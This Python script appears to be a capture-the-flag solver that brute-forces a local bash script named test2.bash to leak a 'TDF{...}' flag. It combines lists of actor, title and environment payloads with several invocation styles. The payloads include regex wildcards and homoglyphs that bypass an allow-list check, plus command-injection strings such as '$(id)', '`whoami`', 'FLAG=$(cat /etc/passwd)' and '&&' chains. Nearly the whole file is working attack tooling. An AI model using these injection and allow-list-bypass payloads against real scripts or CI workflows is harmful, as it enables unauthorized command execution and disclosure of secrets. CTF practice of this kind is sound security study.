import itertools
import os
import re
import shlex
import subprocess
import sys
from typing import Any, Dict, Optional, Tuple

ATTEMPT_TIMEOUT = 5


def safe_quote(value: str) -> str:
    return shlex.quote(value)


def detect_success(stdout: str, stderr: str) -> Optional[Dict[str, str]]:
    combined = f"{stdout}\n{stderr}"
    match = re.search(r"The flag is\s+([^\s]+)", combined)
    if match:
        return {"flag": match.group(1), "reason": "explicit"}
    match = re.search(r"(TDF\{[^}\n]+\})", combined)
    if match:
        return {"flag": match.group(1), "reason": "pattern"}
    match = re.search(r"FLAG=([^\s]+)", combined)
    if match:
        return {"flag": match.group(1), "reason": "env_leak"}
    base64_match = re.search(r"\b[A-Za-z0-9+/]{32,}={0,2}\b", combined)
    if base64_match:
        return {"flag": base64_match.group(0), "reason": "base64_suspect"}
    return None


def run_invocation(
    style_name: str,
    title: str,
    actor: str,
    command_value: Optional[str],
    flag_value: Optional[str],
    script_path: str,
) -> Dict[str, Any]:
    env_base = os.environ.copy()
    env_mod: Dict[str, Optional[str]] = {}
    display_cmd = ""
    try:
        if style_name == "plain":
            cmd = [script_path, title, actor]
            display_cmd = " ".join(safe_quote(part) for part in cmd)
        elif style_name == "prefixed_env":
            if command_value is None or flag_value is None:
                raise ValueError("prefixed_env requires COMMAND and FLAG values")
            command_str = (
                f"COMMAND={safe_quote(command_value)} FLAG={safe_quote(flag_value)} "
                f"{safe_quote(script_path)} {safe_quote(title)} {safe_quote(actor)}"
            )
            cmd = ["/bin/bash", "-c", command_str]
            display_cmd = "/bin/bash -c " + safe_quote(command_str)
            env_mod = {"COMMAND": command_value, "FLAG": flag_value}
        elif style_name == "env_command":
            if command_value is None or flag_value is None:
                raise ValueError("env_command requires COMMAND and FLAG values")
            cmd = ["env", f"COMMAND={command_value}", f"FLAG={flag_value}", script_path, title, actor]
            display_cmd = " ".join(safe_quote(part) for part in cmd)
            env_mod = {"COMMAND": command_value, "FLAG": flag_value}
        elif style_name == "bash_export":
            if command_value is None or flag_value is None:
                raise ValueError("bash_export requires COMMAND and FLAG values")
            command_str = (
                f"export COMMAND={safe_quote(command_value)} FLAG={safe_quote(flag_value)}; "
                f"{safe_quote(script_path)} {safe_quote(title)} {safe_quote(actor)}"
            )
            cmd = ["/bin/bash", "-c", command_str]
            display_cmd = "/bin/bash -c " + safe_quote(command_str)
            env_mod = {"COMMAND": command_value, "FLAG": flag_value}
        else:
            raise ValueError(f"Unknown invocation style: {style_name}")

        completed = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            env=env_base,
            timeout=ATTEMPT_TIMEOUT,
            check=False,
        )
        return {
            "style": style_name,
            "title": title,
            "actor": actor,
            "command_value": command_value,
            "flag_value": flag_value,
            "display": display_cmd,
            "stdout": completed.stdout,
            "stderr": completed.stderr,
            "returncode": completed.returncode,
            "env_applied": env_mod,
            "skipped": False,
            "error": None,
            "timeout": False,
        }
    except subprocess.TimeoutExpired as exc:
        stdout = exc.stdout or ""
        stderr = exc.stderr or ""
        return {
            "style": style_name,
            "title": title,
            "actor": actor,
            "command_value": command_value,
            "flag_value": flag_value,
            "display": display_cmd or "<timeout>",
            "stdout": stdout,
            "stderr": stderr,
            "returncode": None,
            "env_applied": env_mod,
            "skipped": False,
            "error": f"timeout after {ATTEMPT_TIMEOUT}s",
            "timeout": True,
        }
    except ValueError as exc:
        return {
            "style": style_name,
            "title": title,
            "actor": actor,
            "command_value": command_value,
            "flag_value": flag_value,
            "display": display_cmd or "<invalid>",
            "stdout": "",
            "stderr": "",
            "returncode": None,
            "env_applied": env_mod,
            "skipped": True,
            "error": str(exc),
            "timeout": False,
        }


def log_attempt(attempt_id: int, result: Dict[str, Any]) -> None:
    if result["skipped"]:
        print(
            f"[{attempt_id:04d}] style={result['style']} skipped reason={result['error']} "
            f"title={repr(result['title'])} actor={repr(result['actor'])}"
        )
        return

    allowed = "User is allowed to run script" in result["stdout"]
    command_valid = "Command is valid" in result["stdout"]
    status = "timeout" if result["timeout"] else f"exit={result['returncode']}"
    summary = (
        f"[{attempt_id:04d}] style={result['style']} {status} "
        f"allowed={'Y' if allowed else 'N'} gh={'Y' if command_valid else 'N'} "
        f"cmd={result['display']}"
    )
    print(summary)
    if result["stderr"].strip():
        trimmed_err = result["stderr"].strip()
        if len(trimmed_err) > 120:
            trimmed_err = trimmed_err[:117] + "..."
        print(f"       stderr={trimmed_err}")


def report_success(result: Dict[str, Any], success: Dict[str, str]) -> None:
    print("\n[+] Flag disclosure detected!")
    print(f"    Reason: {success['reason']}")
    print(f"    Flag data: {success['flag']}")
    print(f"    Style: {result['style']}")
    print(f"    Command: {result['display']}")
    print(f"    TITLE: {safe_quote(result['title'])}")
    print(f"    ACTOR: {safe_quote(result['actor'])}")
    if result["command_value"] is not None:
        print(f"    COMMAND env: {repr(result['command_value'])}")
    if result["flag_value"] is not None:
        print(f"    FLAG env: {repr(result['flag_value'])}")

    print("\n---- stdout ----")
    print(result["stdout"], end="" if result["stdout"].endswith("\n") else "\n")
    print("---- stderr ----")
    if result["stderr"]:
        print(result["stderr"], end="" if result["stderr"].endswith("\n") else "\n")
    else:
        print("<empty>")


def main() -> None:
    script_path = os.path.abspath("./test2.bash")
    if not os.path.exists(script_path):
        print(f"[-] Unable to locate {script_path}", file=sys.stderr)
        sys.exit(1)

    # Actor payloads exercise whitespace, regex, quoting, homoglyph, and control-character angles.
    actor_payloads = [
        "tr0l",  # Baseline allowed actor per script whitelist.
        "tr0l ",  # Trailing space to check permissive whitespace matching.
        "\ttr0l",  # Leading tab to see if [[ =~ ]] ignores leading whitespace.
        "tr0l\t",  # Trailing tab to poke regex handling.
        " tr0l",  # Leading space to test regex boundaries.
        "tr0l\n",  # Embedded newline probing [[ =~ ]] behaviour.
        "tr0l\r",  # Carriage return variant for CR-stripping bugs.
        "tr0l\r\n",  # Windows-style line ending to stress parsing.
        "tr0l\x00",  # Null-byte injection attempt (will test syscall rejection).
        "tr0l*",  # Glob-like expansion candidate.
        "tr0l.*",  # Regex match to bypass explicit string check.
        "tr0l|.*",  # Regex alternation to force wildcard match.
        ".*",  # Pure wildcard to take advantage of empty allowed list.
        "^$",  # Regex that matches empty strings to exploit ALLOWED_STRINGS bug.
        "[[:print:]]+",  # POSIX class to match any printable characters.
        " ",  # Single space actor to test equality around quotes.
        "",  # Empty actor to strike the unset array branch.
        "\\",  # Lone backslash to test escaping.
        "'",  # Single quote actor to force quoting surprises.
        "\"",  # Double quote actor to do the same.
        "`",  # Backtick to mimic command substitution tokens.
        "$ACTOR",  # Literal variable name to chase accidental evals.
        "$'tr0l\\n'",  # Literal $'...' expression probing eval usage.
        "${COMMAND}",  # Literal parameter expansion to test eval pathways.
        "COMMAND=gh issue list",  # Actor embedding env-style assignment.
        "FLAG=TDF{actor}",  # Actor mimicking flag declaration inline.
        "tr0Ɩ",  # Unicode small L with hook to try homoglyph bypass.
        "tr0ⅼ",  # Unicode roman numeral fifty resembling L.
        "tr0ł",  # Unicode l with stroke to probe unicode normalization.
        "tr0I",  # Uppercase I lookalike to cover ascii homoglyph.
    ]

    # Title payloads explore gh-prefixed commands, env-style assignments, backticks, and subshell markers.
    title_payloads = [
        "baseline run",  # Control title.
        "gh status",  # Benign gh command string.
        "gh issue list",  # Another gh command to keep prefix consistent.
        "COMMAND=gh issue list",  # Title masquerading as env assignment.
        "FLAG=TDF{dummy}",  # Title mimicking flag assignment.
        "$(id)",  # Subshell attempt to see if reused unsafely.
        "`whoami`",  # Backtick variant for same reason.
        "gh    spaced    command",  # Multiple spaces inside command.
        " gh leading space",  # Leading whitespace before gh.
        "gh\nmulti-line",  # Embedded newline for multi-line injection testing.
        "COMMAND=$(echo gh repo list)",  # Title using command substitution.
        "export COMMAND=gh exploit",  # Title styled as export statement.
        "COMMAND=gh whoami",  # Pure assignment style title.
        "FLAG=$(cat /etc/passwd)",  # Title attempting to look like file exfil.
        "",  # Empty title for default behaviour stress.
        "COMMAND=gh repo view && echo hi",  # Title carrying shell chain attempt.
        "gh$(echo _trick)",  # Title mixing gh with substitution.
        "COMMAND:`id`",  # Colon/backtick hybrid.
        "COMMAND=gh; FLAG=TDF{title}",  # Title embedding semicolon.
        "COMMAND='gh alias list'",  # Title with quoted gh command.
    ]

    # Environment payloads rotate gh-prefixed commands and fake flags.
    env_payloads: Tuple[Tuple[str, str], ...] = (
        ("gh issue list", "TDF{dummy}"),  # Directly mirrors user-provided example.
        ("gh repo view", "TDF{placeholder_flag}"),  # Variation to ensure prefix detection.
        ("gh whoami", "FLAG{fake_value}"),  # Alternate command to match documentation example.
    )

    # Invocation styles target different ways inline env could be injected.
    invocation_styles = [
        {"name": "plain", "needs_env": False, "description": "Baseline execution without env tricks."},
        {"name": "prefixed_env", "needs_env": True, "description": "Inline COMMAND=... FLAG=... prefix injection."},
        {"name": "env_command", "needs_env": True, "description": "Use env utility to pass variables with spaces."},
        {"name": "bash_export", "needs_env": True, "description": "Export variables before running script."},
    ]

    attempt_id = 0
    for title, actor in itertools.product(title_payloads, actor_payloads):
        for style in invocation_styles:
            env_values = env_payloads if style["needs_env"] else ((None, None),)
            for command_value, flag_value in env_values:
                attempt_id += 1
                result = run_invocation(
                    style_name=style["name"],
                    title=title,
                    actor=actor,
                    command_value=command_value,
                    flag_value=flag_value,
                    script_path=script_path,
                )
                log_attempt(attempt_id, result)
                if result["skipped"]:
                    continue
                success = detect_success(result["stdout"], result["stderr"])
                if success:
                    report_success(result, success)
                    sys.exit(0)

    print("\n[-] Exhausted payload space without uncovering the flag.")
    sys.exit(1)


if __name__ == "__main__":
    main()
